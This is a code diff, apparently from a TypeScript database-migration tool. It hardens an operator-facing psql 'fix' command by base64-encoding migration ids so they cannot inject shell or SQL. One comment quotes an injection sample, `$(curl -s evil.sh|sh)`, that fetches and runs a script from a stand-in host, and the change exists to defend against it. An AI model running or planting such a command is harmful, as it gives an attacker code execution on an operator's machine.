@@ -10,7 +10,7 @@ import { expectedQueryLoop } from './expected-loop';
 import type { SchemaDescription } from './introspect';
 import { migrateConcurrent, migrationConflict, rollbackStepsInvalid } from './migration-errors';
 import { poolProfileFor } from './pool-profile';
-import { literal, raw, shellInertIdentifier, sql } from './sql';
+import { raw, sql } from './sql';
 import { SQLSTATE, sqlState } from './sqlstate';
 import { statementsOf } from './statement-split';
 import { type DbTx, withTransaction } from './transaction';
@@ -181,31 +181,31 @@ export function auditLedger(
 }
 
 /**
- * Both halves of that `fix:` are the DATABASE's own text — whoever can write a ledger row picks
- * what lands in a line an operator pastes — and it goes inside SHELL DOUBLE QUOTES, where `$(…)`
- * and a backtick substitute before psql is reached at all. Measured before this screen: an id of
- * `$(curl -s evil.sh|sh)` produced exactly that command. `shellInertIdentifier` is the tree's ONE
- * screen for a name reaching a `fix:`, and a refusal DEGRADES the line to prose naming no command
- * — the shape `drift-findings.ts` already uses — because there is no quoted form that makes a
- * hostile name safe to paste.
+ * The migration id is the DATABASE's own text — whoever can write a ledger row picks what lands in
+ * a line an operator pastes — and it goes inside SHELL DOUBLE QUOTES, where `$(…)` and a backtick
+ * substitute before psql is reached at all. Measured before this screen: an id of
+ * `$(curl -s evil.sh|sh)` produced exactly that command.
  *
- * The id is rendered through `literal()` on the way into the statement, not interpolated: a `'`
- * is legal in an identifier and inert in a shell, so the screen passes it deliberately, and it
- * would close the SQL string literal it is spliced into.
+ * So the id does not go in as text. It goes in **base64**, decoded by Postgres itself
+ * (`convert_from(decode(…,'base64'),'UTF8')`), and the base64 alphabet is `A-Za-z0-9+/=` — every
+ * character of it inert in shell double quotes and inert inside a SQL string literal. One command
+ * shape for every ledger row there can be, with no screen, no branch and no escape to get wrong.
+ *
+ * It DID branch: `shellInertIdentifier` screened both the id and the app version, and a refusal
+ * degraded the whole line to prose naming no command — so a row could take the one instruction
+ * away from the operator by holding a space. An error that stops being an instruction under
+ * adversarial input is an error the adversary silenced (axiom 4). The version is not in the line
+ * at all any more; the CAUSE already names it, and the fix's job is to be runnable.
+ *
+ * The id is unreadable in the command, and that is the trade: `cause:` is where a human reads
+ * which migration this is, `fix:` is where they paste. `psql` echoes the row count it deleted.
  */
 function conflictFix(row: LedgerRow): string {
-  const inertId = shellInertIdentifier(row.id);
-  const inertVersion = shellInertIdentifier(row.app_version);
-  if (inertId === null || inertVersion === null) {
-    return (
-      'deploy the app version named in this error, or drop its ledger row by hand — its ' +
-      'migration id or its app version carries a backtick, a dollar sign, a double quote, a ' +
-      'backslash or whitespace, so no command here can spell it'
-    );
-  }
+  const encodedId = Buffer.from(row.id, 'utf8').toString('base64');
   return (
-    `deploy app version "${row.app_version}" — or, if that build is gone, drop its row: ` +
-    `psql "$DATABASE_URL" -c "delete from ${LEDGER_TABLE} where id = ${literal(row.id).text}"`
+    'deploy the app version this error names — or, if that build is gone, drop its row: ' +
+    `psql "$DATABASE_URL" -c "delete from ${LEDGER_TABLE} ` +
+    `where id = convert_from(decode('${encodedId}', 'base64'), 'UTF8')"`
   );
 }
 
